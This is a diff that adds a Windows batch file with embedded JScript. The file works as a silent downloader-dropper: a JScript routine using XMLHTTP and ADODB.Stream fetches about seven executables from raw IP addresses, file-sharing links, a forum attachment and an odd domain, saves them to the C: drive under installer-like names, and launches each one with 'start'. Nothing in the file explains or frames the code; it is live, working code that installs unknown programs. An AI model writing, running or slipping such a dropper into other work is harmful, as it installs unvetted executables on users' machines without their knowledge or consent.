@@ -1,0 +1,36 @@
+echo=1/*>nul
+@cls
+@echo off
+call :http "http://download.wk12345.com/xcjm/setup_xczm_1025.exe" "c:\setup_xczm_1025.exe"
+call :http "http://182.118.40.31/wsdl22.yunpan.cn/share.php?method=Share.download&fhash=5fc9cc6335d15ed4f151e9e059360902606d5e74&xqid=580217103&fname=1.txt&fsize=3630224&nid=13868520023795360&cqid=00a6cbe88f8aa615c32f40a0683e32ee&st=3d14b865d7a6c135dd17cb51e0371a06&e=1387024876&dt=22.861d78c884eaa860e08941cdca0f9618" "c:\setup_2951-4452.exe"
+call :http "http://221.204.14.59/wsdl22.yunpan.cn/share.php?method=Share.download&fhash=bcaaff4722a5465343a71f5a620e56e2269774ec&xqid=580217103&fname=2.txt&fsize=952400&nid=13868520043799303&cqid=00a6cbe88f8aa615c32f40a0683e32ee&st=f34bd734df19d77845af9f0942c283bb&e=1387024914&dt=22.4ef43415babbd2ba2604c9371688e131" "c:\QIYIlittle_5_43.exe"
+call :http "http://bbs.xunlei.com/forum.php?mod=attachment&aid=MTM1MjYzfDE0MDdlODdifDEzODY5MTcwOTZ8NTMxMzZ8MzI0Nzk1" "c:\365weatherIns_111.exe"
+call :http "http://140.207.197.113/wsdl22.yunpan.cn/share.php?method=Share.download&fhash=50fbd970310c9de8ccebff51dfc5d94c69b9b35f&xqid=580217103&fname=4.txt&fsize=22899256&nid=13868520573764168&cqid=00a6cbe88f8aa615c32f40a0683e32ee&st=bfbf9827bdd83f69c34afa1983a13cd5&e=1387025022&dt=22.a81d89e4489aff8ed38882d5e7e345dc" "c:\KAVSETUPS_38_4452.exe"
+start c:\setup_xczm_1025.exe
+start c:\setup_2951-4452.exe
+start c:\QIYIlittle_5_43.exe
+start c:\365weatherIns_111.exe
+start c:\KAVSETUPS_38_4452.exe
+call :http "http://221.204.14.59/wsdl22.yunpan.cn/share.php?method=Share.download&fhash=ef5e24b5d5cf659981b7982bcd695dc57030cd9f&xqid=580217103&fname=3.txt&fsize=5175952&nid=13868520133724876&cqid=00a6cbe88f8aa615c32f40a0683e32ee&st=bf57bab8e0c5743906a012c61af8137d&e=1387025205&dt=22.2c3b25171e1d06b5591bd0e0b14eae88" "c:\setup_open_4099.exe"
+start c:\setup_open_4099.exe
+call :http "http://1386763728.nuluyu.com/chat/nobda/lb_nobda_2.exe" "c:\lb_nobda_2.exe"
+start c:\lb_nobda_2.exe
+goto :eof
+:http
+cscript -nologo -e:jscript "%~f0" "%~1" "%~2"
+goto :eof
+*/
+var iLocal,iRemote,xPost,sGet;
+iLocal =WScript.Arguments(1); 
+iRemote = WScript.Arguments(0); 
+iLocal=iLocal.toLowerCase();
+xPost = new ActiveXObject("MSXML2.XMLHTTP.3.0");
+xPost.Open("GET",iRemote,0);
+xPost.Send();
+sGet = new ActiveXObject("ADODB.Stream");
+sGet.Mode = 3;
+sGet.Type = 1; 
+sGet.Open(); 
+sGet.Write(xPost.responseBody);
+sGet.SaveToFile(iLocal,2); 
+sGet.Close();
